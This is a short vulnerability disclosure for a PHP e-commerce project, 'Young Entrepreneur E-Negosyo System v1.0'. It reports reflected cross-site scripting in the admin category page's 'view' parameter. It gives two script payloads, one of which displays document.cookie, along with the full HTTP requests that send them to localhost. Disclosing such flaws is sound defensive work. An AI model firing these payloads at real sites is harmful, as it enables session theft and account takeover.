# Young Entrepreneur E-Negosyo System v1.0 has Cross-site scripting (reflected)

BUG_Author: aroc

Website source address: https://www.sourcecodester.com/php/12684/young-entrepreneur-e-negosyo-system.html

Vulnerability File: /bsenordering/admin/category/index.php

GET parameter 'view' exists XSS vulnerability

Payload1:/bsenordering/admin/category/index.php?view=<script>alert(233)</script>

```
GET /bsenordering/admin/category/index.php?view=%3Cscript%3Ealert(233)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=b474rdfl9bppo3rms87201i42t
Connection: close
```

![image](https://github.com/Apeng96/bug_report/blob/main/xss1.png)

Payload2:/bsenordering/admin/category/index.php?view=<script>alert(document.cookie)</script>

```
GET /bsenordering/admin/category/index.php?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=b474rdfl9bppo3rms87201i42t
Connection: close
```

![image](https://github.com/Apeng96/bug_report/blob/main/xss2.png)
